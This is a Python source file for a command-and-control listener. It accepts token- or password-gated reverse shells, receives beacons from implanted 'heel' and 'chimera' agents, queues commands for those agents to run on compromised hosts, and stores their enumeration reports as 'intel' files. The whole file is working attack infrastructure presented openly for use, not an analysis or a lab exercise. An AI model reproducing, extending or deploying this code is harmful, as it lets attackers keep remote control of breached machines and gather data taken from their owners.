#!/usr/bin/env python3
"""c2_listener_10001.py — Token-Gated Reverse Shell & Beacon Listener

Handles:
  - Legacy sh3ll_4cc3ss_b0rg_2026 reverse shells (backward compat)
  - TOKEN:<daily_hmac> token-gated shells
  - HTTP POST /beacon (chimera style)
  - HTTP GET /ping (chimera cron)
  - HEEL_BEACON <hostname> <token> <pid> — heel agent heartbeats
  - HEEL_REPORT <hostname> <token> — full heel enumeration dumps
  - HEEL_EXEC <hostname> <token> <cmd> — queue exec command for container beacon

by 🇭🇷PhonkAlphabet
"""

import socket
import threading
import hmac
import hashlib
import datetime
import json
import os
import sys
import signal
import logging
import subprocess
import time
from pathlib import Path
from typing import Optional, Tuple

# ─── Logging ────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] C2: %(message)s")
log = logging.getLogger("C2-10001")

# ─── Shared HMAC Key (same as ntp_forge_server / payload_server_10004) ─
HMAC_KEY = b"CHANGE_ME_PAYLOAD_KEY"
LISTEN_ADDR = "0.0.0.0"
LISTEN_PORT = 10001
MAX_LINE = 4096
SHELL_TIMEOUT = 300  # 5-min idle timeout per shell session

running = True

# Command queue for container beacons — dispatcher writes, beacons poll
_pending_commands: dict = {}
_pending_lock = threading.Lock()


def daily_token() -> str:
    """Generate today's HMAC token (same as payload server)."""
    date_str = datetime.datetime.utcnow().strftime("%Y-%m-%d")
    return hmac.new(HMAC_KEY, date_str.encode(), hashlib.sha256).hexdigest()[:16]


def validate_token(received: str) -> bool:
    """Check if received string matches today's HMAC token."""
    return received.strip() == daily_token()


def handle_reverse_shell(client: socket.socket, addr: tuple):
    """Spawn /bin/sh for authenticated client, relay I/O."""
    ip, rport = addr
    log.info(f"[+] Shell session opened: {ip}:{rport}")
    try:
        os.dup2(client.fileno(), 0)
        os.dup2(client.fileno(), 1)
        os.dup2(client.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        log.warning(f"Shell error {ip}:{rport}: {e}")
    finally:
        try:
            client.close()
        except OSError:
            pass
    log.info(f"[-] Shell session closed: {ip}:{rport}")


def handle_heel_exec(client: socket.socket, addr: tuple, greeting: str):
    """Handle HEEL_EXEC <hostname> <token> <cmd> — queue command for a beacon."""
    ip, rport = addr
    parts = greeting.split(" ", 3)
    if len(parts) < 4:
        client.sendall(b"HEEL_EXEC_ERR malformed\n")
        client.close()
        return

    hostname = parts[1]
    token = parts[2]
    cmd = parts[3] if len(parts) > 3 else ""

    if not validate_token(token):
        client.sendall(b"HEEL_AUTH_FAIL\n")
        client.close()
        return

    with _pending_lock:
        _pending_commands[hostname] = cmd

    log.info(f"[HEEL_EXEC] Queued for {hostname}: {cmd[:200]}")
    client.sendall(b"HEEL_EXEC_OK queued\n")
    client.close()


def handle_heel_beacon(client: socket.socket, addr: tuple, greeting: str):
    """Handle HEEL_BEACON <hostname> <token> <pid> protocol."""
    ip, rport = addr
    parts = greeting.split()
    if len(parts) < 4:
        log.warning(f"[HEEL] Malformed beacon from {ip}:{rport}: {greeting[:64]}")
        client.sendall(b"HEEL_ERR malformed\n")
        client.close()
        return

    hostname = parts[1]
    token = parts[2]
    pid = parts[3] if len(parts) > 3 else "0"

    if not validate_token(token):
        log.warning(f"[HEEL] Invalid token from {ip} ({hostname}): {token[:16]}")
        client.sendall(b"HEEL_AUTH_FAIL\n")
        client.close()
        return

    log.info(f"[HEEL] ✅ Beacon from {hostname} ({ip}) pid={pid}")
    _log_beacon(ip, f"HEEL:{hostname}:{pid}")

    # Check if there's a pending command for this hostname
    with _pending_lock:
        pending = _pending_commands.pop(hostname, None)

    if pending:
        log.info(f"[HEEL] Dispatching pending command to {hostname}: {pending}")
        client.sendall(f"EXEC:{pending}\n".encode())
        client.settimeout(5.0)
        try:
            data = client.recv(4096)
            if data:
                log.info(f"[HEEL] Response from {hostname}: {data.decode(errors='replace')[:256]}")
        except:
            pass
        client.close()
        return

    # Respond with available commands — keep connection open for 30s
    try:
        client.sendall(b"HEEL_ACK commands:shell,persist,update,enumerate,kill\n")
        client.settimeout(30.0)
        while True:
            data = client.recv(4096)
            if not data:
                break
            cmd = data.decode(errors="replace").strip().lower()
            log.info(f"[HEEL] Command from C2→{hostname}: {cmd}")
            # Echo back which cmd was received (C2 operator sends commands)
            client.sendall(f"HEEL_CMD:{cmd}\n".encode())
    except socket.timeout:
        pass
    except Exception as e:
        log.warning(f"[HEEL] Beacon session error {ip}: {e}")
    finally:
        try:
            client.close()
        except OSError:
            pass


def handle_heel_report(client: socket.socket, addr: tuple, greeting: str):
    """Handle HEEL_REPORT <hostname> <token> — full enumeration dump."""
    ip, rport = addr
    parts = greeting.split()
    if len(parts) < 3:
        log.warning(f"[HEEL] Malformed report header from {ip}: {greeting[:64]}")
        client.sendall(b"HEEL_ERR malformed\n")
        client.close()
        return

    hostname = parts[1]
    token = parts[2]

    if not validate_token(token):
        log.warning(f"[HEEL] Invalid report token from {ip} ({hostname})")
        client.sendall(b"HEEL_AUTH_FAIL\n")
        client.close()
        return

    log.info(f"[HEEL] 📥 Receiving enumeration report from {hostname} ({ip})...")
    client.sendall(b"HEEL_ACK send_report\n")

    # Read full report
    report_data = greeting  # Start with the header line
    client.settimeout(15.0)
    try:
        while True:
            chunk = client.recv(65536)
            if not chunk:
                break
            report_data += chunk.decode(errors="replace")
    except socket.timeout:
        pass
    except Exception as e:
        log.warning(f"[HEEL] Report read error {ip}: {e}")

    log.info(f"[HEEL] ✅ Report from {hostname} ({ip}): {len(report_data)} bytes")
    _log_intel(ip, hostname, report_data)
    _log_beacon(ip, f"HEEL_REPORT:{hostname}:{len(report_data)}b")

    try:
        client.sendall(f"HEEL_ACK report_received {len(report_data)}b\n".encode())
        client.close()
    except OSError:
        pass


def _log_intel(ip: str, hostname: str, report: str):
    """Log intel data to flat file."""
    intel_dir = Path("/var/log/c2-intel")
    intel_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    fname = intel_dir / f"{hostname}-{ip}-{ts}.json"
    try:
        with open(fname, "w") as f:
            f.write(report)
    except Exception as e:
        log.warning(f"Intel write error: {e}")


def _log_beacon(ip: str, tag: str):
    """Log beacon to beacon DB."""
    db_path = "/var/log/c2-intel/beacons.log"
    ts = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(db_path, "a") as f:
            f.write(f"{ts} {ip} {tag}\n")
    except Exception as e:
        pass


def handle_client(client: socket.socket, addr: tuple):
    """Route incoming connection based on greeting."""
    ip, rport = addr
    try:
        client.settimeout(10.0)
        greeting = client.recv(MAX_LINE).decode(errors="replace").strip()
    except socket.timeout:
        log.debug(f"[TIMEOUT] No greeting from {ip}:{rport}")
        try:
            client.close()
        except OSError:
            pass
        return
    except Exception as e:
        log.debug(f"[ERR] {ip}:{rport}: {e}")
        try:
            client.close()
        except OSError:
            pass
        return

    if not greeting:
        client.close()
        return

    # ─── HTTP-style beacons (POST /beacon, GET /ping) ────────────
    if greeting.startswith("POST /beacon"):
        log.info(f"[HTTP] Chimera beacon from {ip}:{rport}")
        client.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nACK\n")
        client.close()
        return
    if greeting.startswith("GET /ping"):
        client.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nPONG\n")
        client.close()
        return

    # ─── Legacy sh3ll_4cc3ss_b0rg_2026 ───────────────────────────
    if "sh3ll_4cc3ss_b0rg_2026" in greeting:
        log.info(f"[LEGACY] sh3ll_4cc3ss_b0rg_2026 from {ip}:{rport}")
        client.sendall(b"LEGACY_OK\n")
        handle_reverse_shell(client, addr)
        return

    # ─── HEEL_BEACON protocol ───────────────────────────────────
    if greeting.startswith("HEEL_BEACON"):
        handle_heel_beacon(client, addr, greeting)
        return

    # ─── HEEL_REPORT protocol ───────────────────────────────────
    if greeting.startswith("HEEL_REPORT"):
        handle_heel_report(client, addr, greeting)
        return

    # ─── HEEL_EXEC protocol ─────────────────────────────────────
    if greeting.startswith("HEEL_EXEC"):
        handle_heel_exec(client, addr, greeting)
        return

    # ─── Plain beacon / unknown ─────────────────────────────────
    log.info(f"[UNKNOWN] {ip}:{rport} — {greeting[:128]}")
    client.sendall(b"IDENTIFY: TOKEN:<daily_token> or sh3ll_4cc3ss_b0rg_2026\n")
    client.close()


def listener():
    """Main listener loop."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((LISTEN_ADDR, LISTEN_PORT))
    except OSError as e:
        log.error(f"Bind failed on {LISTEN_PORT}: {e}")
        sys.exit(1)
    sock.listen(128)
    sock.settimeout(1.0)

    log.info(f"📡 C2 Listener on 0.0.0.0:{LISTEN_PORT}")
    log.info(f"🔑 Daily token: {daily_token()}")

    while running:
        try:
            client, addr = sock.accept()
            t = threading.Thread(target=handle_client, args=(client, addr), daemon=True)
            t.start()
        except socket.timeout:
            continue
        except OSError:
            continue
        except Exception as e:
            log.warning(f"Accept error: {e}")

    sock.close()
    log.info("C2 Listener stopped")


def signal_handler(sig, frame):
    global running
    log.info("🛑 Shutting down C2 Listener...")
    running = False


def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    listener()


if __name__ == "__main__":
    main()
